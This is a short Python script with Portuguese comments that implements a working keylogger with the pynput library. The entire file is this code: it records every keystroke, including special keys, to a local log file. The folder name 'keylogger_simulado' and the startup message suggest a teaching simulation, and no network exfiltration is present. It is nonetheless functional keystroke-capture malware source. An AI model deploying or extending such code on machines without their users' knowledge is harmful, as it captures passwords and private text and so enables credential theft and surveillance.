from pynput import keyboard

# Define o nome do arquivo de log
LOG_FILE = "keylogger_simulado/log.txt"

# Lista de teclas de modificação a serem ignoradas
IGNORAR = [
    keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.caps_lock, keyboard.Key.cmd
]

def on_press(key):
    """Registra a tecla pressionada em um arquivo de log local."""
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        try:
            # Tecla alfanumérica
            f.write(key.char)
            
        except AttributeError:
            # Tecla especial
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write(" [TAB] ")
            elif key == keyboard.Key.backspace:
                f.write(" [BACKSPACE] ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass 
            else:
                f.write(f" [{str(key).replace('Key.', '')}] ")

def main():
    print(f"Keylogger Local iniciado. O log está sendo salvo em: {LOG_FILE}")
    print("Pressione CTRL+C ou ESC (se configurado) para parar.")
    # Listener monitora o teclado até ser interrompido
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()